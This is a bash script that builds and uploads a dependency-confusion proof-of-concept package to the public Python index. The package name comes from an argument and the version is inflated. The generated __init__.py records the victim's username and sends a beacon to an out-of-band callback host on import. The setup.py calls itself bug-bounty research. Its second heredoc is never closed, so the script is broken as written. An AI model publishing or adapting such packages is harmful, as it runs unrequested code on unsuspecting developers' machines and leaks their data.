#!/bin/bash
pkg=$1

mkdir $pkg
cd $pkg
mkdir $pkg
cd $pkg
touch __init__.py

cat > __init__.py <<EOF
import os, requests
from setuptools import setup

proof_path = "/tmp/dep_confusion_poc_by_seeker0xatwearehackeronedotcom.txt"
with open(proof_path, "w") as f:
    f.write(f"Vulnerable at {os.environ.get('USER')}")

try:
    requests.post("https://$pkg.qlcbitwoqeabfuogzvdubtnagoj9k8ure.oast.fun/", data={"$pkg": "installed"}, timeout=2)
except:
    pass

setup(name="$pkg", version="13.37")
EOF

cd ..
touch setup.py

cat > setup.py << EOF
from setuptools import setup, find_packages

setup(
    name="$pkg",
    version="13.3.7",
    author="seeker0x",
    author_email="<seeker0x@wearehackerone.com>",
    description="This package is a proof of concept used by seeker0x to conduct a research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. I do not accept any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this package.",
    packages=find_packages(),
    install_requires=[],
)
python3 setup.py sdist bdist_wheel
#pip3 install twine --break-system-packages
twine upload dist/*  --verbose
